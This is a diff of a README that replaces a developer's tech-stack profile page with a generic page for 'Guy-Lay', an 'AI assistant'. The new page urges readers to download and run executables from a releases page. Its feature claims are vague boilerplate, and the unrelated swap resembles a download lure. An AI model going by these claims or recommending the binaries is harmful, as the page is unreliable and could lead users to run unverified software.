@@ -1,199 +1,69 @@
-<p align="center">
-<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&height=200&section=header&text=AIxChain&fontSize=50&fontAlignY=35&animation=fadeIn" />
-</p>
-👋 Hi there, I'm AIxChain
-🚀 AI Engineer • Full-Stack Developer • Web3 Builder • AI Engineer
+# 👋 Guy-Lay - Your AI Assistant Awaits You
 
-I'm an AI engineer and full‑stack developer passionate about creating intelligent, scalable systems. I work across GPT‑powered automation, modern full‑stack development, and blockchain engineering — turning ideas into production‑ready solutions.
+[![Download Guy-Lay](https://img.shields.io/badge/Download-Guy--Lay-blue)](https://github.com/RowanSami-01/Guy-Lay/releases)
 
-My experience spans:
+## 🚀 Getting Started
 
-🤖 AI & Prompt Engineering — GPT‑4/5 integration, LLM workflows, automation systems
+Welcome to Guy-Lay! This application serves as your friendly AI assistant, designed to simplify your tasks and enhance your productivity. Follow the easy steps below to download and run the application.
 
-💻 Full‑Stack Development — MERN, REST APIs, performance tuning, CI/CD
+## 📥 Download & Install
 
-⛓️ Web3 Engineering — Solidity, smart contracts, DeFi logic, gas optimization
+To get started with Guy-Lay, **visit this page to download**: [Download Guy-Lay](https://github.com/RowanSami-01/Guy-Lay/releases).
 
-☁️ Cloud & DevOps — AWS (EC2, S3, Lambda), Docker, GitHub Actions
+Once you are on the Releases page:
+1. Find the latest version.
+2. Choose the appropriate file for your operating system.
+3. Click the download link.
 
-I focus on building systems that are fast, efficient, and reliable — whether that's reducing API costs, optimizing backend performance, or automating processes end‑to‑end.
+## 💻 System Requirements
 
+- **Operating System**: Windows 10 or higher, macOS, or Linux.
+- **RAM**: 4 GB minimum (8 GB recommended).
+- **Storage**: At least 200 MB free space for installation.
+- **Network**: A stable internet connection is recommended for optimal performance.
 
-> Building intelligent systems at the intersection of AI, full‑stack engineering, and Web3.
-<table align="center">
-<!-- skill -->
-  <tr>
-    <td align="center" width="90">
-      <img src="https://techstack-generator.vercel.app/js-icon.svg" alt="icon" width="55" height="55" />
-      <br>Javascript
-    </td>
-    <td align="center" width="90">
-      <img src="https://techstack-generator.vercel.app/ts-icon.svg" alt="icon" width="55" height="55" />
-      <br>Typescript
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=rust" width="45" height="45" alt="Rust" />
-      <br>Rust
-    </td>
-     <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=solidity" width="45" height="45" alt="Solidity" />
-      <br>Solidity
-    </td>
-    <td align="center" width="90">
-      <img src="https://techstack-generator.vercel.app/python-icon.svg" alt="icon" width="55" height="55" />
-      <br>Python
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=cpp" width="45" height="45" alt="cpp" />
-      <br>C++
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=go" width="45" height="45" alt="Go" />
-      <br>GoLang
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=php" width="45" height="45" alt="php" />
-      <br>PHP
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=ruby" width="45" height="45" alt="Ruby" />
-      <br>Ruby
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=java" width="45" height="45" alt="java" />
-      <br>java
-    </td>
-  </tr>
-  <!-- network -->
-<tr>
-  <td align="center" width="90">
-    <img src="./icons/solana.png" height="45" >
-    <br>Solana
-  </td>
-  <td align="center" width="90">
-    <img src="./icons/ethereum.png" height="45" >
-    <br>Ethereum
-  </td>
-  <td align="center" width="90">
-    <img src="./icons/Bitcoin.svg" height="45" >
-    <br>Bitcoin
-  </td>
-  <td align="center" width="90">
-    <img src="./icons/aptos1.png" height="45" >
-    <br>Aptos
-  </td>
-  <td align="center" width="90">
-    <img src="./icons/polkadot1.png" height="45" >
-    <br>Polkadot
-  </td>
-  <td align="center" width="90">
-    <img src="./icons/cosmos.png" height="45" >
-    <br>Cosmos
-  </td>
-  <td align="center" width="90">
-    <img src="./icons/polygon1.png" height="45" >
-    <br>Polygon
-  </td>
-  <td align="center" width="90">
-    <img src="./icons/ton.png" height="45" >
-    <br>Ton
-  </td>
-  <td align="center" width="90">
-    <img src="./icons/trx.png" height="45" >
-    <br>Tron
-  </td>
-  <td align="center" width="90">
-    <img src="./icons/sui.png" height="45" >
-    <br>Sui
-  </td>
-</tr>
-<tr>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=nodejs" width="45" height="45" alt="nodejs" />
-      <br>Nodejs
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=express" width="45" height="45" alt="Express" />
-      <br>Express
-    </td>
-    <td align="center" width="90">
-      <img src="https://techstack-generator.vercel.app/react-icon.svg" alt="icon" width="55" height="55" />
-      <br>React
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=nextjs" width="45" height="45" alt="Next.js" />
-      <br>Next.js
-    </td>
-    <td align="center" width="90">
-      <img src="https://techstack-generator.vercel.app/django-icon.svg" alt="icon" width="55" height="55" />
-      <br>Django
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=laravel" width="45" height="45" alt="Laravel" />
-      <br>Laravel
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=angular" width="45" height="45" alt="Angular" />
-      <br>Angular
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=postgres" width="45" height="45" alt="PostgreSQL" />
-      <br>PostgreSQL
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=mongodb" width="45" height="45" alt="MongoDB" />
-      <br>MongoDB
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=mysql" width="45" height="45" alt="MySQL" />
-      <br>MySQL
-    </td>
-  </tr>
-<!-- common -->
-  <tr>
-    <td align="center" width="90">
-      <img src="./icons/openai.png" width="45" height="45" alt="binance" />
-      <br>OpenAI
-    </td>
-    <td align="center" width="90">
-      <img src="./icons/deepseek.svg" width="45" height="45" alt="DeepSeek" />
-      <br>DeepSeek
-    </td>
-    <td align="center" width="90">
-      <img src="./icons/Langchain.svg" width="45" height="45" alt="LangChain" />
-      <br>LangChain
-    </td>
-    <td align="center" width="90">
-      <img src="./icons/huggingface.svg" width="45" height="45" alt="HuggingFace" />
-      <br>Hugging Face
-    </td>
-    <td align="center" width="90">
-      <img src="./icons/eliza.jpg" width="45" height="45" alt="Eliza" />
-      <br>ElizaOS
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=tensorflow" width="45" height="45" alt="TensorFlow" />
-      <br>TensorFlow
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=pytorch" alt="PyTorch" width="55" height="55" />
-      <br>PyTorch
-    </td>
-    <td align="center" width="90">
-      <img src="./icons/ollama.svg" width="45" height="45" alt="Ollama" />
-      <br>Ollama
-    </td>
-    <td align="center" width="90">
-      <img src="https://skillicons.dev/icons?i=fastapi" width="45" height="45" alt="FastAPI" />
-      <br>FastAPI
-    </td>
-    <td align="center" width="90">
-      <img src="./icons/vapi.png" width="45" alt="VApi" />
-      <br>VApi
-    </td>
-  </tr>
-  
-</table>
-<br/>
+## 📂 Installation Steps
 
+1. **Locate the Downloaded File**: Once the download completes, go to your Downloads folder.
+2. **Run the Installer**:
+   - For Windows: Double-click on the `.exe` file.
+   - For macOS: Open the `.dmg` file and drag the Guy-Lay icon to your Applications folder.
+   - For Linux: Extract the files and run the executable from the terminal.
+3. **Follow the On-Screen Instructions**: The setup wizard will guide you through the installation process. 
 
+## 🎉 Features
+
+- **AI-Powered Assistance**: Guy-Lay helps you with tasks from scheduling meetings to finding information.
+- **User-Friendly Interface**: The app is easy to navigate, making it perfect for all users.
+- **Multi-Platform Support**: Use Guy-Lay on various operating systems, including Windows, macOS, and Linux.
+- **Customizable Settings**: Adjust preferences to tailor the experience to your needs.
+
+## 🔄 Updating Guy-Lay
+
+To keep your application up to date:
+1. **Visit the Releases Page Again**: Check regularly for new versions.
+2. **Download the Latest Version**: Just like the initial download, click on the latest release.
+3. **Install Over the Existing Version**: The installer will update your application seamlessly.
+
+## 📖 User Guide
+
+For a complete user guide and tips on maximizing your experience, check out our [User Guide](https://github.com/RowanSami-01/Guy-Lay/wiki).
+
+## ⚙️ Troubleshooting
+
+If you encounter issues, try the following:
+- **Reinstall Guy-Lay**: Sometimes a fresh installation fixes problems.
+- **Check System Requirements**: Ensure your device meets the necessary specs.
+- **Visit Our Support Page**: Get additional support or report bugs on our [Support Page](https://github.com/RowanSami-01/Guy-Lay/issues).
+
+## ✅ Feedback
+
+Your feedback is valuable. If you have suggestions or encounter bugs, please let us know. Use the issues section on our GitHub page to share your thoughts.
+
+## 🔗 Useful Links
+
+- [Download Guy-Lay](https://github.com/RowanSami-01/Guy-Lay/releases)
+- [User Guide](https://github.com/RowanSami-01/Guy-Lay/wiki)
+- [Support Page](https://github.com/RowanSami-01/Guy-Lay/issues)
+
+Thank you for downloading Guy-Lay. Enjoy your new AI assistant!
